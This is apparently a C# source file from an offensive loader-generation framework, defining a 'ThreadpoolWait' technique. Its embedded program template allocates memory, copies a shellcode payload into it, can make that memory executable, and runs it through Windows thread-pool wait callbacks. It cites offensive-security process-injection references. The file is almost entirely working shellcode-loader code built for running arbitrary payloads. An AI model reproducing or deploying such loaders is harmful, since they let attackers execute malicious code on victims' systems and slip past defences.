using System.Collections.Generic;

namespace SingleDose.Techniques.Loaders
{
    internal class ThreadpoolWait : ITechnique
    {
        string ITechnique.TechniqueName => "ThreadpoolWait";

        string ITechnique.TechniqueDescription => null;
        
        List<string> ITechnique.TechniqueReferences => new List<string>() 
        {
            @"https://www.ired.team/offensive-security/code-injection-process-injection/shellcode-execution-via-createthreadpoolwait",
            @"https://gist.github.com/alfarom256/180c90c2bc0ae6bfa5d109d822ea77a4"
        };

        bool ITechnique.IsUnsafe => false;

        bool ITechnique.IsLoader => true;
        
        List<string> ITechnique.Invokes => new List<string>() { "VirtualAlloc", "CreateEvent", "CreateThreadpoolWait", "SetThreadpoolWait", "WaitForSingleObject"};
        
        List<string> ITechnique.Prerequisites => null;
        
        string ITechnique.Base => @"
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Linq;

namespace {{NAMESPACE}}
{
    class Program
    {
        static void Main(string[] args)
        {
            {{MODE}}
            {{TRIGGER}}
            IntPtr hAlloc = VirtualAlloc(IntPtr.Zero, (uint)payload.Length, 0x1000 | 0x2000, {{flProtect}});
            Marshal.Copy(payload, 0, hAlloc, payload.Length);
            {{PROTECT}}
            IntPtr hEvent = CreateEvent(IntPtr.Zero, false, true, null);
            IntPtr pThreadPoolWait = CreateThreadpoolWait(hAlloc, IntPtr.Zero, IntPtr.Zero);

            SetThreadpoolWait(pThreadPoolWait, hEvent, IntPtr.Zero);
            WaitForSingleObject(hEvent, 0xFFFFFFFF);
        }

        {{ARGS}}
        {{INVOKE}}
    }
}";

        string ITechnique.VProtect => @"uint oldProtect;
            VirtualProtectEx(Process.GetCurrentProcess().Handle, hAlloc, payload.Length, 0x20, out oldProtect);";
    }
}
